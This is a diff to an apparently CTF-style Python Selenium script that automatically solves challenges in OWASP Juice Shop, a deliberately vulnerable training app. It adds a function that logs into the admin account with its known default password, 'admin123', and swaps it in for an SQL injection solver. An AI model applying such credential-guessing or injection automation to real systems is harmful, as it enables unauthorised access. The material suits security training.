@@ -55,6 +55,22 @@ def union_select(server, browser):
     sleep(3)
     print('Success.')
 
+def access_administration_site(server, browser):
+    login = "admin@juice-sh.op"
+    password = "admin123"
+    print('Accessing administration site...', end=''),
+    browser.get('{}/'.format(server))
+    browser.get('{}/#/login'.format(server))
+    sleep(2)
+    browser.find_element(by=By.NAME, value="email").send_keys(login)
+    browser.find_element(by=By.NAME, value="password").send_keys(password)
+    sleep(1)
+    browser.find_element(by=By.ID, value="loginButton").click()
+    sleep(1)
+    browser.get('{}/#/administration'.format(server))
+    sleep(3)
+    print('Success.')
+
 def travel_back_in_time(server, browser):
     print('Travelling back to the glorious days of Geocities...', end=''),
     browser.get('{}/#/score-board'.format(server))
@@ -74,6 +90,7 @@ def take_screenshot_of_score_and_quit(server, browser):
     browser.quit()
 
 
+
 def solve_browser_challenges(server):
     print('\n== BROWSER CHALLENGES ==\n')
     try:
@@ -86,7 +103,8 @@ def solve_browser_challenges(server):
     # directory_listing(server, browser)
     # error_handlind(server, browser)
     # dev_backup_null_byte(server, browser)
-    union_select(server, browser)
+    # union_select(server, browser)
+    access_administration_site(server, browser)
     #travel_back_in_time(server, browser)
     #take_screenshot_of_score_and_quit(server, browser)
     print('\n== BROWSER CHALLENGES COMPLETE ==\n')
